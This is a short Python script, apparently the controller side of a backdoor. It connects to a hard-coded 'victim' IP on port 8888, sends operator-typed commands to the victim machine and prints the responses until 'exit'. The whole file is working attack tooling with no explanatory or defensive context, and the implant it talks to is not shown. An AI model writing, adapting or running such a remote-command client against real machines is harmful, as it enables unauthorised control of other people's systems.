import socket

# victim_ip = input("Enter victim ip > ")
victim_ip = "192.168.56.1"
victim_port = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((victim_ip, victim_port))

# greetings
print(s.recv(1024 * 4).decode(), end="")

while True:
    command = input()
    s.send(command.encode())
    print(s.recv(1024 * 4).decode(), end="")
    if command == "exit":
        break
